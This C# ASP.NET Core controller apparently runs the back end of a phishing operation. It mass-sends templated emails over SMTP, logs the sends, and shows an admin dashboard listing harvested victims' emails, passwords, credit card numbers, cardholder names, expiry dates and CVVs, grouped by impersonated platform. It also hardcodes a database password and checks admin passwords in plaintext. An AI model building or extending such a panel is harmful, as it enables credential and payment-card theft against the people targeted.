using System;
using System.Collections.Generic;
using System.Diagnostics;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Npgsql;
using WebProject.Models;
using WebProject.Functions;

namespace WebProject.Controllers
{
    public class HomeController : Controller
    {
        private readonly string connectionString =
            "Server=localhost;Port=5432;Username=erdemkurt;Password=353535;Database=phishing;";

        // private readonly string connectionString = "Server=localhost;Port=49152;Username=senayilmaz;Password=2002;Database=webprojectdb;";
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        // Display the default view
        public IActionResult Index()
        {
            return View();
        }

        // Handle the form submission for admin login
        [HttpPost]
        public IActionResult Index(AdminModel hacker)
        {
            bool isHacker = CheckAdmin(hacker);

            if (isHacker)
            {
                return RedirectToAction("AdminDashboard", "Home");
            }
            else
            {
                ViewData["ErrorMessage"] = "Username or password is incorrect";
            }

            return View();
        }

        // Display the admin dashboard
        public IActionResult AdminDashboard()
        {
            List<UserModel> phishingUserList = GetUserFromDatabase();
            Dictionary<int, int> platformCounts = GetPlatformCountsFromDatabase();
            ViewBag.PlatformCounts = platformCounts;

            return View(phishingUserList);
        }

        // Display the form for sending emails
        public IActionResult SendEmail()
        {
            SendEmailViewModel viewModel = new SendEmailViewModel();
            List<UserModel> userEmail = GetUserFromDatabase();
            List<EmailTemplateModel> emailTemplates = GetEmailTemplatesFromDatabase();
            viewModel.EmailTemplates = emailTemplates;

            return View(viewModel);
        }

        // Handle the form submission for sending emails
        [HttpPost]
        public IActionResult SendEmail(SendEmailViewModel data)
        {
            SendEmailViewModel viewModel = new SendEmailViewModel();
            List<EmailTemplateModel> emailTemplates = GetEmailTemplatesFromDatabase();
            var template_id = data.et_id;
            var emails = data.mailto;
            var selectedTemplate = emailTemplates[0]; // default

            for (int i = 0; i < data.mailto.Count; i++)
            {
                InsertSentEmailsToDatabase(data.mailto[i], int.Parse(template_id), DateTime.Now);
                Debug.WriteLine(data.mailto[i]);
            }

            Debug.WriteLine(data.et_id);
            foreach (var template in emailTemplates)
            {
                if (template.et_id == int.Parse(template_id))
                {
                    selectedTemplate = template;
                }
            }

            foreach (var email in emails)
            {
                SMTP mail = new SMTP(email);
                mail.SendMail(selectedTemplate.template_content, selectedTemplate.template_name);
            }

            viewModel.EmailTemplates = emailTemplates;

            return View(viewModel);
        }

        // Display the email templates
        public IActionResult EmailTemplates()
        {
            var emailTemplates = GetEmailTemplatesFromDatabase();
            return View(emailTemplates);
        }

        // Display the statistics page
        public IActionResult Statistics()
        {
            List<SendMail> sentUserListmails = GetSentEmailFromDatabase();
            Dictionary<int, int> platformCounts = GetPlatformCountsFromDatabase();
            ViewBag.PlatformCounts = platformCounts;

            List<string> templateNames = new List<string>();
            for (int i = 0; i < sentUserListmails.Count; i++)
            {
                templateNames.Add(GetEmailTemplateName(sentUserListmails[i].et_id));
            }

            ViewBag.TemplateNames = templateNames;
            ViewBag.TotalEmails = sentUserListmails.Count;
            ViewBag.TotalUsers = GetUserFromDatabase().Count;
            ViewBag.PlatformCounts = GetPlatformsFromDatabase();

            return View(sentUserListmails);
        }

        // Handle errors
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }

        // Delete an email template
        public IActionResult DeleteTemplate(int id)
        {
            bool isExecuteCorrect = DeleteEmailTemplateFromDatabase(id);

            if (isExecuteCorrect)
            {
                ViewData["SuccessMessage"] = "Template is deleted";
            }
            else
            {
                ViewData["ErrorMessage"] = "Template is not deleted";
            }

            return RedirectToAction("EmailTemplates", "Home");
        }

        // Delete an email template from the database
        private bool DeleteEmailTemplateFromDatabase(int id)
        {
            string deleteQuery = "DELETE FROM email_templates WHERE et_id = @TemplateId";
            bool isExecuteCorrect = false;

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(deleteQuery, connection))
                {
                    command.Parameters.AddWithValue("@TemplateId", id);
                    isExecuteCorrect = command.ExecuteNonQuery() > 0;
                }
            }

            return isExecuteCorrect;
        }

        // Retrieve user data from the database
        private List<UserModel> GetUserFromDatabase()
        {
            string selectQuery =
                "SELECT pu.user_id, pu.user_email, pu.user_password, pu.user_cc, pu.user_date,pu.user_name_on_card ,pu.user_cvv, pl.platform_name, pu.platform_id " +
                "FROM \"phishing_users\" pu " +
                "INNER JOIN \"platforms\" pl ON pu.platform_id = pl.platform_id";

            List<UserModel> phishingUserList = new List<UserModel>();

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(selectQuery, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            UserModel phishingUser = new UserModel
                            {
                                user_id = reader["user_id"] != DBNull.Value ? Convert.ToInt32(reader["user_id"]) : 0,
                                platform_id = reader["platform_id"] != DBNull.Value
                                    ? Convert.ToInt32(reader["platform_id"])
                                    : 0,
                                user_email = reader["user_email"].ToString(),
                                user_password = reader["user_password"].ToString(),
                                user_name_on_card = reader["user_name_on_card"] != DBNull.Value
                                    ? reader["user_name_on_card"].ToString()
                                    : null,
                                user_cc = reader["user_cc"] != DBNull.Value ? reader["user_cc"].ToString() : null,
                                user_date = reader["user_date"] != DBNull.Value ? reader["user_date"].ToString() : null,
                                user_cvv = reader["user_cvv"] != DBNull.Value ? reader["user_cvv"].ToString() : null
                            };
                            phishingUserList.Add(phishingUser);
                        }
                    }
                }
            }

            return phishingUserList;
        }

        // Retrieve platform counts from the database
        public Dictionary<int, int> GetPlatformCountsFromDatabase()
        {
            Dictionary<int, int> platformCounts = new Dictionary<int, int>();
            string selectQuery =
                "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(selectQuery, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            if (reader["platform_id"] != DBNull.Value)
                            {
                                int platformId = Convert.ToInt32(reader["platform_id"]);
                                int count = Convert.ToInt32(reader["user_count"]);
                                platformCounts.Add(platformId, count);
                            }
                        }
                    }
                }
            }

            return platformCounts;
        }

        // Retrieve email templates from the database
        private List<EmailTemplateModel> GetEmailTemplatesFromDatabase()
        {
            string selectQuery = "SELECT * FROM email_templates";

            List<EmailTemplateModel> emailTemplates = new List<EmailTemplateModel>();

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(selectQuery, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            EmailTemplateModel emailTemplate = new EmailTemplateModel
                            {
                                et_id = Convert.ToInt32(reader["et_id"]),
                                template_name = reader["template_name"].ToString(),
                                template_content = reader["template_content"].ToString(),
                                platform_id = Convert.ToInt32(reader["platform_id"]),
                                click_count = Convert.ToInt32(reader["click_count"])
                            };
                            emailTemplates.Add(emailTemplate);
                        }
                    }
                }
            }

            return emailTemplates;
        }

        // Check if the provided credentials match an admin record in the database
        public bool CheckAdmin(AdminModel admin)
        {
            string selectQuery =
                "SELECT * FROM admin WHERE admin_username = @AdminName AND admin_password = @AdminPassword";
            bool isExecuteCorrect = false;

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(selectQuery, connection))
                {
                    command.Parameters.AddWithValue("@AdminName", admin.admin_username);
                    command.Parameters.AddWithValue("@AdminPassword", admin.admin_password);

                    using (var reader = command.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            isExecuteCorrect = true;
                        }
                    }
                }
            }

            return isExecuteCorrect;
        }

        // Retrieve sent emails from the database
        public List<SendMail> GetSentEmailFromDatabase()
        {
            string selectQuery = "SELECT * FROM sent_emails";
            List<SendMail> sentEmails = new List<SendMail>();

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(selectQuery, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            SendMail sentEmail = new SendMail
                            {
                                et_id = Convert.ToInt32(reader["et_id"]),
                                mailto = reader["mailto"].ToString(),
                                date_time = Convert.ToDateTime(reader["date_time"])
                            };
                            sentEmails.Add(sentEmail);
                        }
                    }
                }
            }

            return sentEmails;
        }

        // Insert sent emails into the database
        private void InsertSentEmailsToDatabase(string s, int parse, DateTime now)
        {
            string insertQuery =
                "INSERT INTO sent_emails(et_id, mailto, date_time) VALUES(@TemplateId, @MailTo, @Date)";

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(insertQuery, connection))
                {
                    command.Parameters.AddWithValue("@TemplateId", parse);
                    command.Parameters.AddWithValue("@MailTo", s);
                    command.Parameters.AddWithValue("@Date", DateTime.Now);
                    command.ExecuteNonQuery();
                }
            }
        }

        // Retrieve the name of an email template from the database
        public string GetEmailTemplateName(int et_id)
        {
            string selectQuery = "SELECT template_name FROM email_templates WHERE et_id = @TemplateId";
            string templateName = "";

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(selectQuery, connection))
                {
                    command.Parameters.AddWithValue("@TemplateId", et_id);

                    using (var reader = command.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            templateName = reader["template_name"].ToString();
                        }
                    }
                }
            }

            return templateName;
        }

        // Retrieve platform counts from the database
        public Dictionary<int, int> GetPlatformsFromDatabase()
        {
            Dictionary<int, int> platformCounts = new Dictionary<int, int>();
            string selectQuery =
                "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";

            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();

                using (var command = new NpgsqlCommand(selectQuery, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            if (reader["platform_id"] != DBNull.Value)
                            {
                                int platformId = Convert.ToInt32(reader["platform_id"]);
                                int count = Convert.ToInt32(reader["user_count"]);

                                if (!platformCounts.ContainsKey(platformId))
                                {
                                    platformCounts.Add(platformId, count);
                                }
                                else
                                {
                                    platformCounts[platformId] += count;
                                }
                            }
                        }
                    }
                }
            }

            return platformCounts;
        }
    }
}